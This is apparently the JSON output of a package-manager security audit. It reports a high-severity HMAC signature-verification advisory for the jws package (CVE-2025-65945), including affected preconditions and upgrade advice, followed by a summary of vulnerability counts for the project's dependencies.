{"type":"auditAdvisory","data":{"resolution":{"id":1111244,"path":"node-pushnotifications>@parse/node-apn>jsonwebtoken>jws","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"3.2.2","paths":["node-pushnotifications>@parse/node-apn>jsonwebtoken>jws"]},{"version":"3.2.2","paths":["node-pushnotifications>firebase-admin>jsonwebtoken>jws"]}],"found_by":null,"deleted":null,"references":"- https://github.com/auth0/node-jws/security/advisories/GHSA-869p-cjfg-cm3x\n- https://github.com/auth0/node-jws/commit/34c45b2c04434f925b638de6a061de9339c0ea2e\n- https://github.com/auth0/node-jws/commit/4f6e73f24df42f07d632dec6431ade8eda8d11a6\n- https://github.com/auth0/node-jws/releases/tag/v3.2.3\n- https://github.com/auth0/node-jws/releases/tag/v4.0.1\n- https://nvd.nist.gov/vuln/detail/CVE-2025-65945\n- https://github.com/advisories/GHSA-869p-cjfg-cm3x","created":"2025-12-04T16:54:15.000Z","id":1111244,"npm_advisory_id":null,"overview":"### Overview\nAn improper signature verification vulnerability exists when using auth0/node-jws with the HS256 algorithm under specific conditions.\n\n### Am I Affected?\nYou are affected by this vulnerability if you meet all of the following preconditions:\n\n1. Application uses the auth0/node-jws implementation of JSON Web Signatures, versions <=3.2.2 || 4.0.0\n2. Application uses the jws.createVerify() function for HMAC algorithms\n3. Application uses user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\nYou are NOT affected by this vulnerability if you meet any of the following preconditions:\n1. Application uses the jws.verify() interface (note: `auth0/node-jsonwebtoken` users fall into this category and are therefore NOT affected by this vulnerability)\n2. Application uses only asymmetric algorithms (e.g. RS256)\n3. Application doesn’t use user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\n### Fix\nUpgrade auth0/node-jws version to version 3.2.3 or 4.0.1\n\n### Acknowledgement\nOkta would like to thank Félix Charette for discovering this vulnerability.","reported_by":null,"title":"auth0/node-jws Improperly Verifies HMAC Signature","metadata":null,"cves":["CVE-2025-65945"],"access":"public","severity":"high","module_name":"jws","vulnerable_versions":"<3.2.3","github_advisory_id":"GHSA-869p-cjfg-cm3x","recommendation":"Upgrade to version 3.2.3 or later","patched_versions":">=3.2.3","updated":"2025-12-04T22:50:04.000Z","cvss":{"score":7.5,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"},"cwe":["CWE-347"],"url":"https://github.com/advisories/GHSA-869p-cjfg-cm3x"}}}
{"type":"auditSummary","data":{"vulnerabilities":{"info":0,"low":0,"moderate":6,"high":19,"critical":5},"dependencies":257,"devDependencies":0,"optionalDependencies":0,"totalDependencies":257}}
